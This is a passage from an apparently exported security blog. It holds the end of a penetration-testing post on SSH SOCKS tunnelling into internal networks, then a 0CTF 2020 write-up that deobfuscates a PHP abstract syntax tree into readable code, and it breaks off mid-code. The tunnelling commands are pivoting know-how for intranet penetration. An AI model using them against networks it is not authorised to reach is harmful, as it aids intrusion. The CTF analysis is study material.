<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">即远程机器在设置127.0.0.1:7777的socks5代理后可以通过192.168.1.1的ssh隧道访问本地服务</span></span><br></pre></td></tr></table></figure>

<p>构建ssh隧道的常用参数:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-C 压缩传输，提高传输速度</span><br><span class="line">-f 后台执行数据传输</span><br><span class="line">-N 建立静默连接</span><br><span class="line">-g 允许远程主机连接本地用于转发的端口</span><br><span class="line">-L 本地端口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发，即SOCKS代理</span><br><span class="line">-p 指定ssh连接端口</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/9454">内网穿透的n种姿势</a></p>
<p><a href="https://xz.aliyun.com/t/7701">内网渗透之内网穿透</a></p>
]]></content>
      <tags>
        <tag>Penertration</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 0CTF Unlimited</title>
    <url>/2020/09/29/2020-0CTF-Unlimited/</url>
    <content><![CDATA[<blockquote>
<p>PHP AST + 反混淆 + 矩阵快速幂</p>
</blockquote>
<p>唯一带有Web特征的逆向题</p>
<span id="more"></span>

<p><a href="https://mega.nz/file/uJ4HgQTK#xq0vn5txVQ7kgroD5x4b3kpd87-fKviU8_Cuwvb7pAc">题目</a>是一个经过混淆的PHP抽象语法树文件，请点击题目下载</p>
<p>一开始想直接找抽象语法树（AST）转为PHP代码的函数，找到了<a href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Pretty_printing.markdown">pretty_printing</a>，但是尝试许久，无法直接将AST初始化</p>
<h3 id="JsonDecoder"><a href="#JsonDecoder" class="headerlink" title="JsonDecoder"></a>JsonDecoder</h3><p>继续查资料看到PHP-Parser可以将json字符串和AST进行互转</p>
<p><a href="https://github.com/nikic/PHP-Parser/blob/master/lib/PhpParser/JsonDecoder.php">https://github.com/nikic/PHP-Parser/blob/master/lib/PhpParser/JsonDecoder.php</a></p>
<p>AST转json脚本如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeDumper</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = &lt;&lt;&lt;<span class="string">&#x27;CODE&#x27;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printLine</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">&#125;</span><br><span class="line">CODE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP转化为AST再转化为Json</span></span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;<span class="title function_ invoke__">create</span>(<span class="title class_">ParserFactory</span>::PREFER_PHP7);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// PHP =&gt; AST</span></span><br><span class="line">    <span class="variable">$ast</span> = <span class="variable">$parser</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$code</span>);</span><br><span class="line">    <span class="variable">$dumper</span> = <span class="keyword">new</span> NodeDumper;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dumper</span>-&gt;<span class="title function_ invoke__">dump</span>(<span class="variable">$ast</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// AST =&gt; Json</span></span><br><span class="line">    <span class="variable">$json</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ast</span>, JSON_PRETTY_PRINT);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$json</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PhpParser\<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Parse Error: &#x27;</span>, <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Json转化为AST再转化为PHP</span></span><br><span class="line"><span class="variable">$json</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;3.json&quot;</span>);</span><br><span class="line"><span class="comment">// $json = &lt;&lt;&lt;&#x27;CODE&#x27;</span></span><br><span class="line"><span class="comment">// ]</span></span><br><span class="line"><span class="comment">// CODE;</span></span><br><span class="line"><span class="comment">// Json =&gt; AST</span></span><br><span class="line"><span class="variable">$jsonDecoder</span> = <span class="keyword">new</span> PhpParser\<span class="title function_ invoke__">JsonDecoder</span>();</span><br><span class="line"><span class="variable">$ast</span> = <span class="variable">$jsonDecoder</span>-&gt;<span class="title function_ invoke__">decode</span>(<span class="variable">$json</span>);</span><br><span class="line"><span class="comment">// AST =&gt; PHP</span></span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;<span class="title function_ invoke__">create</span>(<span class="title class_">ParserFactory</span>::PREFER_PHP7);</span><br><span class="line"><span class="variable">$prettyPrinter</span> = <span class="keyword">new</span> PrettyPrinter\Standard;</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$prettyPrinter</span>-&gt;<span class="title function_ invoke__">prettyPrint</span>(<span class="variable">$ast</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$code</span>, <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>其中json字符串如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;nodeType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Stmt_Function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;byRef&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;nodeType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;printLine&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;nodeType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Param&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;byRef&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;variadic&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;var&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;nodeType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Expr_Variable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;msg&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;attributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;startLine&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;endLine&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;default&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;flags&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;attrGroups&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;returnType&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stmts&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;nodeType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Stmt_Echo&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;exprs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;nodeType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Expr_Variable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;msg&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;attrGroups&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>AST如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">array(</span><br><span class="line">    <span class="number">0</span><span class="punctuation">:</span> Stmt_Function(</span><br><span class="line">        attrGroups<span class="punctuation">:</span> array(</span><br><span class="line">        )</span><br><span class="line">        byRef<span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line">        name<span class="punctuation">:</span> Identifier(</span><br><span class="line">            name<span class="punctuation">:</span> printLine</span><br><span class="line">        )</span><br><span class="line">        params<span class="punctuation">:</span> array(</span><br><span class="line">            <span class="number">0</span><span class="punctuation">:</span> Param(</span><br><span class="line">                attrGroups<span class="punctuation">:</span> array(</span><br><span class="line">                )</span><br><span class="line">                flags<span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">                type<span class="punctuation">:</span> <span class="keyword">null</span></span><br><span class="line">                byRef<span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line">                variadic<span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line">                var<span class="punctuation">:</span> Expr_Variable(</span><br><span class="line">                    name<span class="punctuation">:</span> msg</span><br><span class="line">                )</span><br><span class="line">                default<span class="punctuation">:</span> <span class="keyword">null</span></span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">        returnType<span class="punctuation">:</span> <span class="keyword">null</span></span><br><span class="line">        stmts<span class="punctuation">:</span> array(</span><br><span class="line">            <span class="number">0</span><span class="punctuation">:</span> Stmt_Echo(</span><br><span class="line">                exprs<span class="punctuation">:</span> array(</span><br><span class="line">                    <span class="number">0</span><span class="punctuation">:</span> Expr_Variable(</span><br><span class="line">                        name<span class="punctuation">:</span> msg</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>根据上面的例子，我们可以观察到要把AST转为Json需要进行以下处理：</p>
<ol>
<li>将<code>array(...)</code>转换为<code>[...]</code></li>
<li>将<code>Stmt_Function(...)</code> 转化为<code>&#123;&quot;nodeType&quot;: &quot;Stmt_Function&quot;, ...&#125;</code></li>
<li>对于全部字符串要加上引号</li>
<li>在<code>&quot;nodeType&quot;</code>后面添加<code>&quot;attributes&quot;: &#123;&#125;</code>属性</li>
</ol>
<p>这里给出一个AST转Json的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">out = <span class="built_in">open</span>(<span class="string">&quot;4.json&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">lines = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">brackets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">range</span>(lines):</span><br><span class="line">	tmp = data[line].strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	<span class="comment"># 检测 array</span></span><br><span class="line">	res1 = re.findall(<span class="string">r&quot;array\(&quot;</span>, tmp)</span><br><span class="line">	<span class="keyword">if</span> res1:</span><br><span class="line">		brackets.append(<span class="string">&quot;]&quot;</span>)</span><br><span class="line">		tmp = tmp.replace(<span class="string">&quot;array(&quot;</span>, <span class="string">&quot;[&quot;</span>)</span><br><span class="line">	<span class="comment"># 检测 class</span></span><br><span class="line">	res2 = re.findall(<span class="string">r&quot;(\w+)\(&quot;</span>, tmp)</span><br><span class="line">	<span class="keyword">if</span> res2:</span><br><span class="line">		brackets.append(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">		tmp = tmp.replace(res2[<span class="number">0</span>] + <span class="string">&quot;(&quot;</span>, <span class="string">&quot;&#123;nodeType: %s, attributes: &#123;&#125;&quot;</span> % res2[<span class="number">0</span>])</span><br><span class="line">	<span class="comment"># 删除多余标签</span></span><br><span class="line">	res3 = re.findall(<span class="string">r&quot;(\d+: )&quot;</span>, tmp)</span><br><span class="line">	<span class="keyword">if</span> res3:</span><br><span class="line">		tmp = tmp.replace(res3[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="comment"># 添加引号</span></span><br><span class="line">	res4 = re.findall(<span class="string">r&quot;(flag\&#123;| \&#125;|[\w\-]+)&quot;</span>, tmp)</span><br><span class="line">	<span class="keyword">if</span> res4:</span><br><span class="line">		<span class="keyword">for</span> word <span class="keyword">in</span> res4:</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> (word.isdigit() <span class="keyword">or</span> word == <span class="string">&quot;null&quot;</span> <span class="keyword">or</span> word == <span class="string">&quot;true&quot;</span> <span class="keyword">or</span> word == <span class="string">&quot;false&quot;</span>):</span><br><span class="line">				<span class="keyword">if</span> word == <span class="string">&quot; &#125;&quot;</span>:</span><br><span class="line">					word = <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">				tmp = tmp.replace(word, <span class="string">&#x27;&quot;%s&quot;&#x27;</span> % word)</span><br><span class="line">	<span class="comment"># 匹配右括号</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;)&quot;</span> <span class="keyword">in</span> tmp:</span><br><span class="line">		tmp = tmp.replace(<span class="string">&quot;)&quot;</span>, brackets.pop())</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 添加逗号</span></span><br><span class="line">	<span class="keyword">if</span> ((line + <span class="number">1</span>) &lt; lines) <span class="keyword">and</span> (<span class="keyword">not</span> <span class="string">&quot;)&quot;</span> <span class="keyword">in</span> data[line + <span class="number">1</span>]) <span class="keyword">and</span> (<span class="keyword">not</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> tmp):</span><br><span class="line">		tmp = tmp + <span class="string">&quot;,&quot;</span> </span><br><span class="line">	<span class="comment"># 写进文件</span></span><br><span class="line">	out.write(tmp + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">out.close()</span><br></pre></td></tr></table></figure>

<p>最后再用上面的pretty_printing代码转出一份稍微好看点的混淆过的PHP代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$l1IIl1II1l</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IlllI11</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$ll1IlllIIl</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$II1IlllI11</span>, <span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$II1IlllI11</span>(<span class="variable">$lII1lI1IlI</span>(<span class="variable">$II1IlllI11</span>)(<span class="variable">$ll1IlllIIl</span>));</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$llIIllIlll</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lII1lI1IlI</span> + <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$I1lll111II</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lIlIll1111</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IIl1Ill</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$lIlIll1111</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IlllI11</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$lIlIll1111</span>, <span class="variable">$II1IIl1Ill</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$ll1IlllIIl</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$II1IlllI11</span>, <span class="variable">$lIlIll1111</span>, <span class="variable">$II1IIl1Ill</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$lIlIll1111</span>(<span class="variable">$II1IlllI11</span>)(<span class="variable">$II1IIl1Ill</span>(<span class="variable">$II1IlllI11</span>)(<span class="variable">$ll1IlllIIl</span>));</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$I1II11lIl1</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lII1lI1IlI</span> - <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$I1IIlII1Il</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IlllI11</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$ll1IlllIIl</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ll1IlllIIl</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$IIl1II1lIl</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lII1lI1IlI</span> * <span class="number">3</span> % <span class="number">7</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$I1IllI1l11</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lIlIll1111</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$I1lll111II</span>, <span class="variable">$I1IIlII1Il</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IIl1Ill</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$lIlIll1111</span>, <span class="variable">$I1lll111II</span>, <span class="variable">$I1IIlII1Il</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$lIlIll1111</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$II1IIl1Ill</span>))(<span class="variable">$I1IIlII1Il</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$l1I11lll1l</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IlllI11</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$ll1IlllIIl</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$II1IlllI11</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$II1IlllI11</span>(<span class="variable">$ll1IlllIIl</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$lIl1l1lIlI</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$lII1lI1IlI</span> + <span class="number">1</span>) % <span class="number">1000000007</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$l1llIlll1l</span> = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$l1I11lll1l</span>), <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))), <span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1IllI1l11</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$I1IllI1l11</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)))), <span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1IllI1l11</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))))), <span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))), <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))), <span class="keyword">array</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1IllI1l11</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))))), <span class="keyword">array</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>), <span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span 